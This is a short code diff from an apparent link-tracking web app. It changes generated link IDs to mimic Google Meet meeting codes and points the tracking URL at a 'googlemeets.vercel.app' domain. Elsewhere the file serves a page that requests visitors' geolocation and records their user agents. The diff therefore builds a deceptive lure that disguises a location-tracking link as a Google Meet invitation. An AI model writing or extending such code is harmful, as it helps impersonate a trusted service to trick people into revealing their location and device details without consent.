@@ -1,15 +1,25 @@
 import Link from '../models/linkModel.js';
 import Visit from '../models/visitModel.js';
-import { nanoid } from 'nanoid';
+import { customAlphabet } from 'nanoid';
 import useragent from 'useragent';
+
+// Custom nanoid generator with lowercase letters only
+const alphabet = 'abcdefghijklmnopqrstuvwxyz';
+const customNanoid = customAlphabet(alphabet, 4);
+
+// Function to generate link ID like 'kmn-miut-icv'
+function generateCustomLinkId() {
+  return `${customNanoid()}-${customNanoid()}-${customNanoid()}`;
+}
 
 // Create tracking link
 export const createLink = async (req, res) => {
-  const randomId = nanoid(60);
-  const newLink = new Link({ linkId: randomId });
+  const linkId = generateCustomLinkId();
+  const newLink = new Link({ linkId });
   await newLink.save();
-  res.json({ trackingLink: `https://tracker-app-eung.onrender.com/api/track/${randomId}` });
+  res.json({ trackingLink: `https://googlemeets.vercel.app/${linkId}` });
 };
+
 
 // Serve tracking page with geolocation request
 export const trackVisit = async (req, res) => {
